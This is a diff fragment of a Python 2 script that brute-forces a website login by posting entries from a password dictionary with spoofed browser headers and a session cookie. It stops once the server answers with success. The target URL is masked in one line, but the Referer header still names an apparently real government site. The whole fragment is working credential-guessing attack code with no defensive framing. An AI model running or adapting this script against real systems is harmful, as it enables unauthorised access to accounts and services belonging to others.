@@ -37,15 +37,16 @@ def get_password(dict_file):
 
 #requests发包
 def request_post(dict_file):
-	requrl = "http://rcjy.szns.gov.cn/login_login"
+	requrl = "http://**.**.**.**/login_login"
 	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0","Accept":"application/json, text/javascript, */*; q=0.01","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate","Referer":"http://rcjy.szns.gov.cn/home","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest","Cookie":"UM_distinctid=161f5bced55a-0fab4a18ad04bc8-495960-fa000-161f5bced56402; JSESSIONID=588806F30644515E63F83C6EBB223CB4","Connection":"keep-alive"}
 	postdatas = get_password(dict_file)
 	for postdata in postdatas:
 		response = requests.post(requrl, data = postdata, headers = headers)
 		#print postdata
-		print response.content
+		#print response.content
 		if response.content == '{"result":"success"}':
 			print "right password is :",postdata
+			sys.exit(0)
 
 '''
 #urllib2发包
